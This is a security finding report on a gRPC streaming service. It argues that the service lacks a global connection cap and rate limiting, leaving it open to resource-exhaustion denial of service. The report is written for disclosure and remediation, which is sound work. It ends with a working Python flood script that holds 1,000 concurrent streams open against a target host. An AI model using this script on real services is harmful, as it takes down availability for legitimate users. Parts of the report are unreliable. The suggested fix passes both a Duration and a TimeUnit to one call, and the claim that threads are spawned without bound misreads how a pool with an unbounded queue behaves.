### Title
Unbounded Connection Multiplier Enables Resource Exhaustion DoS on gRPC Streaming Service

### Summary
`GrpcConfiguration.grpcServerConfigurer()` applies only a per-connection concurrent call limit (`maxConcurrentCallsPerConnection=5`) with no global connection count limit and no rate limiting. An unauthenticated attacker can open an arbitrary number of TCP connections, each saturating its 5-call quota, driving total concurrent streaming calls to N×5 with no server-side ceiling. This exhausts the shared `applicationTaskExecutor` thread pool and OS-level resources, starving legitimate subscribers of topic message delivery.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35:
```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** `NettyServerBuilder` exposes `maxConnections(int)` to cap total accepted TCP connections globally, but it is never called. Only `maxConcurrentCallsPerConnection` is set. `GrpcProperties` has no field for a global connection ceiling, and the gRPC module has no rate-limiting layer (contrast: `web3` module has `ThrottleConfiguration` with Bucket4j; the gRPC module has nothing equivalent).

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (no authentication required — the gRPC API is public).
2. On each connection, attacker issues 5 long-lived `subscribeTopic` streaming RPCs (the per-connection limit is exactly met, so no connection is rejected).
3. Total concurrent calls = N × 5. Each call is dispatched to `applicationTaskExecutor`.
4. Spring Boot's default `ThreadPoolTaskExecutor` (`applicationTaskExecutor`) has `corePoolSize=8`, `maxPoolSize=Integer.MAX_VALUE`, `queueCapacity=Integer.MAX_VALUE` — it will spawn OS threads without bound until JVM/OS resources are exhausted.
5. At thread saturation, new legitimate subscriber calls queue indefinitely or are rejected; existing streams stall waiting for executor time.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection=5` only limits calls *per connection*; it is multiplicative with connection count, not a global cap.
- No `serverBuilder.maxConnections(...)` call exists anywhere in the codebase.
- No IP-based rate limiting, no connection-count throttle, and no global semaphore guard the gRPC module.

### Impact Explanation
Legitimate subscribers to HCS topic streams receive delayed or no message delivery while the attack is active. The `applicationTaskExecutor` is shared across all gRPC request handling; saturating it with attacker-controlled streaming calls directly degrades throughput for all other subscribers. In a worst-case scenario (thousands of connections), the JVM exhausts native thread memory, causing OOM and full service crash. This is a complete availability loss for the mirror node's gRPC API — the primary interface for HCS topic subscriptions.

### Likelihood Explanation
No authentication or API key is required to open a gRPC connection. The attack requires only a standard gRPC client library and the ability to open many TCP connections — trivially achievable from a single machine or a small botnet. The attack is repeatable and persistent as long as the attacker holds connections open. There is no built-in backpressure or circuit breaker to auto-recover. Likelihood is **high**.

### Recommendation
1. Add a global connection limit to the Netty server builder:
   ```java
   serverBuilder.maxConnectionAge(Duration.ofMinutes(5), TimeUnit.MILLISECONDS);
   serverBuilder.maxConnections(nettyProperties.getMaxConnections()); // new field
   ```
2. Add `maxConnections` (e.g., 500–1000) to `NettyProperties` alongside `maxConcurrentCallsPerConnection`.
3. Add per-IP connection rate limiting at the ingress/load-balancer layer (e.g., Envoy `circuit_breakers`, nginx `limit_conn`).
4. Consider bounding `applicationTaskExecutor` with a finite `maxPoolSize` and a bounded queue so that overload causes fast rejection (RESOURCE_EXHAUSTED gRPC status) rather than unbounded thread creation.
5. Mirror the Bucket4j rate-limiting pattern already used in the `web3` module into the gRPC module.

### Proof of Concept
```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

TARGET = "mirror-node-grpc-host:5600"
CONNECTIONS = 200   # N connections
CALLS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = ConsensusServiceStub(channel)
    request = ConsensusTopicQuery(topic_id=ConsensusTopicID(topic_num=1))
    streams = []
    for _ in range(CALLS_PER_CONN):
        # Each call is a long-lived server-streaming RPC
        stream = stub.subscribeTopic(request)
        streams.append(stream)
    # Hold streams open indefinitely
    for s in streams:
        for _ in s:
            pass

with ThreadPoolExecutor(max_workers=CONNECTIONS) as pool:
    list(pool.map(flood_connection, range(CONNECTIONS)))
# Result: 200 * 5 = 1000 concurrent streaming calls
# applicationTaskExecutor spawns 1000 threads → OOM or starvation
```
